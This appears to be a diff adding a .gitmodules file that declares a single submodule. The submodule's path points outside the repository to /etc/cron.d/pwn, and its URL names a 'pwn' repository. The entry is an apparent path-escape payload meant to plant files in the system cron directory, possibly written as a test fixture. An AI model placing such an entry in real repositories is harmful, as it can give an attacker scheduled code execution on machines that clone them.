@@ -1,0 +1,3 @@
+[submodule "abs"]
+	path = /etc/cron.d/pwn
+	url = https://github.com/acme/pwn.git
